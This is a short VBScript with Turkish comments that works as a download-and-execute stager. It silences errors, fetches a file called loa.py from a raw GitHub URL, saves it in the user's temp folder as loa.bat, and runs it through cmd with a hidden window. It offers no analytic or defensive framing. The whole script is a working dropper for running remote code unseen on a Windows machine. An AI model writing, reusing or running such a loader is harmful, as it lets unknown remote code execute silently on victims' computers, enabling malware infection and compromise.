On Error Resume Next

Dim fso, shell, tempFolder, pyFile, fileExists, pythonCommand, file

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
pyFile = tempFolder & "\loa.bat"

' Dosya var mı kontrol et
fileExists = fso.FileExists(pyFile)

If Not fileExists Then
    ' GitHub'dan kodu indirip loa.py olarak yaz
    Set http = CreateObject("MSXML2.XMLHTTP")
    url = "https://raw.githubusercontent.com/seition2doc/dosta2/main/loa.py"
    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 2 ' Text
        stream.Charset = "utf-8"
        stream.Open
        stream.WriteText http.ResponseText
        stream.SaveToFile pyFile, 2 ' Overwrite if exists
        stream.Close
    Else
        MsgBox "Dosya indirilemedi! HTTP Hata: " & http.Status
        WScript.Quit
    End If
End If

' Python scripti GUI çıkmadan çalıştır
pythonCommand = "cmd /c """ & pyFile & """"
shell.Run pythonCommand, 0, False
